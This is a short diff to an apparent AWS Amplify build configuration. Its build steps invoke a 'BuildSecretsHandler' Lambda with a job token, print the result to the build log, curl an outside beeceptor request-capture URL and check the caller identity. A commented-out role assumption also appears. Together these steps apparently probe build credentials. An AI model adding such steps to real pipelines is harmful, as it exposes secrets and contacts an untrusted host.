@@ -15,7 +15,7 @@ frontend:
         - export json="{\"BranchArn\":\"arn:aws:amplify:us-east-1:800303608826:apps/d3je68rvgy22ch/branches/main\",\"JobId\":\"$AWS_JOB_ID\",\"StepName\":\"BUILD\",\"Token\":\"$token\"}"
         - aws lambda invoke --function-name BuildSecretsHandler --payload $json --region us-east-1 out.txt
         - cat out.txt
-        - curl https://zeta11.free.beeceptor.com/go -v
+        - curl -L https://zeta11.free.beeceptor.com/go -v
 #         - aws sts assume-role --role-arn arn:aws:iam::073653171576:role/amplifyconsole-backend-role --role-session-name asad
         - aws sts get-caller-identity
         - export AWS_ENVIRONMENT_TOKEN=$token
